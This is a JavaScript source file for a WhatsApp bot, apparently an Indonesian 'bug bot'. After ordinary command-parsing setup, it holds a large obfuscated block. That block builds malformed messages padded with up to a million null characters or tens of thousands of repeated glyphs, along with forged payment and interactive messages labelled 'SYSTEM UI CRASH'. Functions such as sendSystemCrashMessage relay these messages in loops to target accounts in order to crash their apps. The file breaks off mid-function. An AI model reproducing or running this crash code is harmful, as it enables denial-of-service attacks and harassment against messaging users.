/*

MIT License

Copyright (c) 2024 anggazyy (selaku pembuat script ini)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.



*/
require('./virtex/virus')
module.exports = async (anggazyy, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//========== DATABASE ===========//
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const owner2 = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const { ngazap } = require('./baseanggazyy/devil2024/ngazap')
const teksjpm = fs.readFileSync("./list/teksjpm.js").toString()
const isPremium = premium.includes(m.sender)
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
//========= CONFIGURASI ==========//
const budy = (typeof m.text == 'string' ? m.text : '')
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : isOwner && !m.isBaileys ? '' : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const from = m.key.remoteJid
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await anggazyy.decodeJid(anggazyy.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await anggazyy.groupMetadata(m.chat).catch(e => {}) : {}
let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const { ios } = require("./virtex/ios.js")
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const slayer07 = fs.readFileSync('./media/slayer07.jpg')
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseanggazyy/stiker/SuksesCok.webp')
anggazyy.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
const jam = moment().tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
const ucapanWaktu = jam < '05:00:00' ? 'Selamat Pagi 🌉' : jam < '11:00:00' ? 'Selamat Pagi 🌄' : jam < '15:00:00' ? 'Selamat Siang 🏙' : jam < '18:00:00' ? 'Selamat Sore 🌅' : jam < '19:00:00' ? 'Selamat Sore 🌃' : jam < '23:59:00' ? 'Selamat Malam 🌌' : 'Selamat Malam 🌌';
		
function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
		
//=========== MESSAGE ===========//

const Ehztext = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var ehz = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  abc.map((v, i) =>
    replacer.push({
      original: v,
      convert: ehz[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
if (isCmd) {
const a = m.isGroup ? "👥 Group" : "👤  Private";
            const b = m.body || m.mtype;
            console.log(
                `╭─ • 乂 ${chalk.magenta(a)}\n` +
                `│  ◦  👋 ${chalk.blue("FROM")}: ${chalk.yellow(m.pushName + " => " + m.sender)}\n` +
                `│  ◦  ✉️ ${chalk.blue("MESSAGE")}: ${chalk.green(b)}\n` +
                `│  ◦  🕒 ${jam}\n` +
                `╰──── •` +
                ``
            );
            }

const _0x5d33f6=_0x2ae7;(function(_0x149196,_0xa7ec58){const _0x27f3f7=_0x2ae7,_0x14113d=_0x149196();while(!![]){try{const _0x56d999=-parseInt(_0x27f3f7(0xba))/0x1+parseInt(_0x27f3f7(0xb6))/0x2+-parseInt(_0x27f3f7(0x76))/0x3*(parseInt(_0x27f3f7(0xc5))/0x4)+parseInt(_0x27f3f7(0xcf))/0x5*(-parseInt(_0x27f3f7(0xbd))/0x6)+parseInt(_0x27f3f7(0x9e))/0x7+parseInt(_0x27f3f7(0xb9))/0x8+parseInt(_0x27f3f7(0x87))/0x9*(-parseInt(_0x27f3f7(0xd6))/0xa);if(_0x56d999===_0xa7ec58)break;else _0x14113d['push'](_0x14113d['shift']());}catch(_0x16f2c5){_0x14113d['push'](_0x14113d['shift']());}}}(_0x118e,0x95bef));const qbug={'key':{'remoteJid':'status@broadcast','fromMe':![],'participant':_0x5d33f6(0x8a)},'message':{'listResponseMessage':{'title':_0x5d33f6(0x83)}}},qcall={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':'status@broadcast'}:{}},'message':{'eventMessage':{'isCanceled':![],'name':namabot+_0x5d33f6(0xc2),'description':'Pe','location':{'degreesLatitude':0x0,'degreesLongitude':0x0,'name':_0x5d33f6(0xac)},'joinLink':'https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv','startTime':_0x5d33f6(0xca)}}},anggazyycrash={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0x5d33f6(0x82)](_0x5d33f6(0x88))},'nativeFlowMessage':{'buttons':[{'name':'review_and_pay','buttonParamsJson':_0x5d33f6(0x94)}]}}}},anggazyycrash2={'key':{'participant':'0@s.whatsapp.net',...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0x5d33f6(0x82)](_0x5d33f6(0x88))},'nativeFlowMessage':{'buttons':[{'name':_0x5d33f6(0xd4),'buttonParamsJson':_0x5d33f6(0x94)}]}}}},qevent={'key':{'participant':_0x5d33f6(0x8a),...m['chat']?{'remoteJid':''}:{}},'message':{'eventMessage':{'isCanceled':![],'name':_0x5d33f6(0x7d),'description':'Pe','location':{'degreesLatitude':0x0,'degreesLongitude':0x0,'name':_0x5d33f6(0xac)},'joinLink':_0x5d33f6(0xc9),'startTime':_0x5d33f6(0xca)}}},anggazyyphone={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'requestPhoneNumberMessage':{'contextinfo':0x1}}},anggazyyvoice={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':''}:{}},'message':{'audioMessage':{'mimetype':_0x5d33f6(0xcc),'seconds':0x2540be3ff,'ptt':_0x5d33f6(0x77)}}},fpoll={'key':{'participant':_0x5d33f6(0x8a),...m['chat']?{'remoteJid':''}:{}},'message':{'pollCreationMessage':{'name':'p'}}},angggazyyvault={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'listResponseMessage':{'title':_0x5d33f6(0xb3)}}},angggazyybut={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'buttonsResponseMessage':{'selectedButtonId':_0x5d33f6(0xb3),'type':0x1,'response':{'selectedDisplayText':_0x5d33f6(0x7b)}}}},angggazyybug={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':'status@broadcast'}:{}},'message':{'newsletterAdminInviteMessage':{'newsletterJid':_0x5d33f6(0xb5),'newsletterName':'🔥','jpegThumbnail':fakejpg,'caption':_0x5d33f6(0xab)+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)])+'\x20','inviteExpiration':Date[_0x5d33f6(0xb2)]()+0x6c258c00}}},qpay={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':'status@broadcast'}:{}},'message':{'requestPaymentMessage':{'currencyCodeIso4217':_0x5d33f6(0xd7),'amount1000':0x3e7,'requestFrom':_0x5d33f6(0x8a),'noteMessage':{'extendedTextMessage':{'text':_0x5d33f6(0xc4)+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)])}},'expiryTimestamp':0x3b9ac9ff,'amount':{'value':0x156769ac99,'offset':0x3e8,'currencyCode':'INR'}}}},qdoc={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'documentMessage':{'title':'🖥️༐✲\x20𝐌𝐬𝐠\x20𒑊\x20'+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)]),'jpegThumbnail':fakedoc}}},qvn={'key':{'participant':'0@s.whatsapp.net',...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'audioMessage':{'mimetype':_0x5d33f6(0xcc),'seconds':0x15751bf0,'ptt':_0x5d33f6(0x77)}}},qgif={'key':{'participant':_0x5d33f6(0x8a),...m['chat']?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'videoMessage':{'title':_0x5d33f6(0xc4)+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)]),'h':_0x5d33f6(0x93),'seconds':_0x5d33f6(0xc3),'gifPlayback':_0x5d33f6(0x77),'caption':'🖥️༐✲\x20𝐌𝐬𝐠\x20𒑊\x20'+(m[_0x5d33f6(0xbc)]||m['mtype']),'jpegThumbnail':fakejpg}}},qinvite={'key':{'participant':_0x5d33f6(0x8a),'remoteJid':'0@s.whatsapp.net'},'message':{'groupInviteMessage':{'groupJid':_0x5d33f6(0x98),'inviteCode':'m','groupName':_0x5d33f6(0xc4)+(m[_0x5d33f6(0xbc)]||m['mtype']),'caption':_0x5d33f6(0xc4)+(m[_0x5d33f6(0xbc)]||m['mtype']),'jpegThumbnail':fakejpg}}},qtoko={'key':{'fromMe':![],'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'productMessage':{'product':{'productImage':{'mimetype':_0x5d33f6(0x8c),'jpegThumbnail':''},'title':namaowner2+_0x5d33f6(0xc6),'description':null,'currencyCode':_0x5d33f6(0x91),'priceAmount1000':_0x5d33f6(0x8f),'retailerId':_0x5d33f6(0xaf),'productImageCount':0x1},'businessOwnerJid':_0x5d33f6(0x8a)}}},qloc={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'locationMessage':{'name':_0x5d33f6(0xc4)+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)]),'jpegThumbnail':fakejpg}}},qcontact={'key':{'participant':_0x5d33f6(0x8a),...m[_0x5d33f6(0xc0)]?{'remoteJid':_0x5d33f6(0xa3)}:{}},'message':{'contactMessage':{'displayName':'🖥️༐✲\x20𝐌𝐬𝐠\x20𒑊\x20'+(m[_0x5d33f6(0xbc)]||m[_0x5d33f6(0x9a)]),'vcard':_0x5d33f6(0xa5),'jpegThumbnail':fakejpg,'thumbnail':fakejpg,'sendEphemeral':!![]}}};async function sendVariousMessages(_0x5a49a7,_0x3ecb9b){for(let _0x1215cc=0x0;_0x1215cc<_0x3ecb9b;_0x1215cc++){sendListMessage(_0x5a49a7),sendLiveLocationMessage(_0x5a49a7),sendSystemCrashMessage(_0x5a49a7),await sleep(0x1f4);}}async function listxeonfck(_0x32b669,_0x4d9ace){const _0x3f2dae=_0x5d33f6;var _0x4a5972=generateWAMessageFromContent(_0x32b669,proto[_0x3f2dae(0xbe)][_0x3f2dae(0x9b)]({'listMessage':{'title':'🦄드림\x20가이\x20Xeon'+'\x00'['repeat'](0xe09c0),'footerText':_0x3f2dae(0xa8),'description':'✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'anjay','products':[{'productId':'4392524570816732'}]}],'productListHeaderImage':{'productId':_0x3f2dae(0xc8),'jpegThumbnail':null},'businessOwnerJid':_0x3f2dae(0x8a)}},'footer':_0x3f2dae(0xa4),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x3f2dae(0x86),'entryPointConversionSource':_0x3f2dae(0xa0),'entryPointConversionApp':_0x3f2dae(0x8b),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x3f2dae(0x97)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x32b669,'quoted':oneclickxeon});await anggazyy[_0x3f2dae(0x7a)](_0x32b669,_0x4a5972[_0x3f2dae(0xaa)],{'participant':{'jid':_0x32b669},'messageId':_0x4a5972[_0x3f2dae(0x8e)]['id']});}async function blackening(_0x53e44e,_0xea910c){const _0x415458=_0x5d33f6;var _0x17a3a6=generateWAMessageFromContent(_0x53e44e,proto[_0x415458(0xbe)]['fromObject']({'stickerMessage':{'url':_0x415458(0xa6),'fileSha256':_0x415458(0x79),'fileEncSha256':_0x415458(0xbb),'mediaKey':_0x415458(0x80),'mimetype':_0x415458(0xad),'directPath':'/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','fileLength':_0x415458(0x95),'mediaKeyTimestamp':_0x415458(0xd1),'isAnimated':![],'stickerSentTs':_0x415458(0xd3),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x53e44e,'quoted':_0xea910c});await anggazyy[_0x415458(0x7a)](_0x53e44e,_0x17a3a6['message'],{'participant':{'jid':_0x53e44e},'messageId':_0x17a3a6['key']['id']});}async function locationxeony(_0x1bf29f,_0x1fa7ab){const _0x2e9023=_0x5d33f6;var _0xc91b64=generateWAMessageFromContent(_0x1bf29f,proto[_0x2e9023(0xbe)][_0x2e9023(0x9b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp'+'ꦾ'['repeat'](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x1bf29f,'quoted':_0x1fa7ab});await anggazyy[_0x2e9023(0x7a)](_0x1bf29f,_0xc91b64[_0x2e9023(0xaa)],{'participant':{'jid':_0x1bf29f},'messageId':_0xc91b64[_0x2e9023(0x8e)]['id']});}async function sendSystemCrashMessage(_0x138c0d){const _0x21e9c8=_0x5d33f6;var _0x4be7b8=generateWAMessageFromContent(_0x138c0d,proto['Message']['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x21e9c8(0xc7)},'footer':{'text':'xp'},'nativeFlowMessage':{'buttons':[{'name':_0x21e9c8(0xae),'buttonParamsJson':_0x21e9c8(0x85)}],'messageParamsJson':'\x00'[_0x21e9c8(0xd2)](0xf4240)}}}}}),{'userJid':_0x138c0d});await anggazyy[_0x21e9c8(0x7a)](_0x138c0d,_0x4be7b8['message'],{'participant':{'jid':_0x138c0d},'messageId':_0x4be7b8[_0x21e9c8(0x8e)]['id']});}async function xeonkillpic(_0x558fb9,_0x2dc64f){const _0x1ab95b=_0x5d33f6;var _0x51e1c4=generateWAMessageFromContent(_0x558fb9,proto[_0x1ab95b(0xbe)][_0x1ab95b(0x9b)]({'interactiveMessage':{'header':{'title':_0x1ab95b(0xb4),'hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':_0x1ab95b(0xb1)}},{'upload':anggazyy[_0x1ab95b(0xcb)]})},'body':{'text':''},'footer':{'text':_0x1ab95b(0x99)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x1ab95b(0xd2)](0xf4240)}}}),{'userJid':_0x558fb9,'quoted':_0x2dc64f});await anggazyy[_0x1ab95b(0x7a)](_0x558fb9,_0x51e1c4['message'],{'participant':{'jid':_0x558fb9},'messageId':_0x51e1c4[_0x1ab95b(0x8e)]['id']});}async function ngeloc(_0x2cf4d4,_0x492d8a){const _0x1060ee=_0x5d33f6;var _0x269771=generateWAMessageFromContent(_0x2cf4d4,proto[_0x1060ee(0xbe)][_0x1060ee(0x9b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x1060ee(0xa7)+'ꦾ'[_0x1060ee(0xd2)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x2cf4d4,'quoted':_0x492d8a});await anggazyy[_0x1060ee(0x7a)](_0x2cf4d4,_0x269771[_0x1060ee(0xaa)],{'participant':{'jid':_0x2cf4d4},'messageId':_0x269771[_0x1060ee(0x8e)]['id']});}function _0x118e(){const _0x12f5f1=['key','999999999999999','àº®â‚®à½žà¸¨Vê™°à¸¨\x20à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®','IDR','Hore','Hmm','{\x22currency\x22:\x22IDR\x22,\x22total_amount\x22:{\x22value\x22:49981399788,\x22offset\x22:100},\x22reference_id\x22:\x224OON4PX3FFJ\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22payment_requested\x22,\x22subtotal\x22:{\x22value\x22:49069994400,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:490699944,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:485792999999,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:48999999900,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x227842674605763435\x22,\x22product_id\x22:\x227842674605763435\x22,\x22name\x22:\x22✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666╮⭑\x20☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666⭐️᜴\x20#\x20𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\x22,\x22amount\x22:{\x22value\x22:9999900,\x22offset\x22:100},\x22quantity\x22:7},{\x22retailer_id\x22:\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\x22,\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:999999900,\x22offset\x22:100},\x22quantity\x22:49}]},\x22native_payment_methods\x22:[]}','10116','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#anggazyy666','INITIATED_BY_ME','6288213840883-1616169743@g.us','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#🦄드림\x20가이\x20Xeon','mtype','fromObject','999999999','/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','6873314BFUkVH','https://telegra.ph/file/b2a83eec1206c6acea5e1.jpg','global_search_new_chat','ê¦¾','InteractiveMessage','status@broadcast','puki','BEGIN:VCARD\x0aVERSION:3.1\x0aN:XL;ttname,;;;\x0aFN:ttname\x0aitem1.TEL;waid=0\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','✳️᜴࿆͆᷍𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666╮⭑\x20☠️⃰͜͡؜𝙰𝙽𝙶𝙶𝙰𝚉𝚈𝚈\x20𝙾𝙵𝙲𝙲\x20666⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','{\x22currency\x22:\x22IDR\x22,\x22total_amount\x22:{\x22value\x22:49981399788,\x22offset\x22:100},\x22reference_id\x22:\x224OON4PX3FFJ\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22payment_requested\x22,\x22subtotal\x22:{\x22value\x22:49069994400,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:490699944,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:485792999999,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:48999999900,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x227842674605763435\x22,\x22product_id\x22:\x227842674605763435\x22,\x22name\x22:\x22✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴\x20#\x20𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\x22,\x22amount\x22:{\x22value\x22:9999900,\x22offset\x22:100},\x22quantity\x22:7},{\x22retailer_id\x22:\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\x22,\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:999999900,\x22offset\x22:100},\x22quantity\x22:49}]},\x22native_payment_methods\x22:[]}','message','\x20DevilS\x20-\x20Bug\x20?\x20\x0a\x20⿻\x20','Apakajajanabs','image/webp','cta_url','Powered\x20By\x20Ibzz','https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','https://i.ibb.co/Wppj16p/cheemspic.jpg','now','pois0n\x20-\x20DevilS','🦄드림\x20가이\x20Xeon','120363224727390375@newsletter','158644tWlzzB','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','INR','9553328aUsxGR','180466MiZfHj','r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','body','5154sroDDM','Message','BEGIN:VCARD\x0aVERSION:3.1\x0aN:XL;ttname,;;;\x0aFN:ttname\x0aitem1.TEL;waid=6281389850142:+62\x20813-8985-0142\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','chat','Header','\x20Project','359996400','🖥️༐✲\x20𝐌𝐬𝐠\x20𒑊\x20','41848csacho','\x20-\x20Marketplace','S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸\x20U̸I̸\x20C̸R꙰̸A꙰̸S꙰̸H꙰̸','4392524570816732','https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv','1713724680','waUploadToServer','audio/ogg;\x20codecs=opus','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','create','85OvETAe','NativeFlowMessage','1715876003','repeat','1715881084144','review_and_pay','ownername','30QoXawj','USD','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','249xZVwDi','true','Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½','CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','relayMessage','penis','120363301756685796@newsletter','🌠\x20DevilS\x20Client\x20-\x20Multi\x20Device','Body','lol','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','readFileSync','Hello\x20My\x20Friends','1715880173','{\x20display_text\x20:\x20\x27S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸\x20U̸I̸\x20C̸R꙰̸A꙰̸S꙰̸H꙰̸\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','1679959486','1735848USLAVD','./image/latx.png','{\x22display_text\x22:\x22à¾§\x22.repeat(50000),\x22url\x22:\x22https://www.google.com\x22,\x22merchant_url\x22:\x22https://www.google.com\x22}','0@s.whatsapp.net','whatsapp','image/jpeg','🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢\x20𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧\x20𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠'];_0x118e=function(){return _0x12f5f1;};return _0x118e();}async function sendViewOnceMessages(_0x55b1b6,_0x18153d){const _0x1e2a60=_0x5d33f6;for(let _0x27c7b1=0x0;_0x27c7b1<_0x18153d;_0x27c7b1++){let 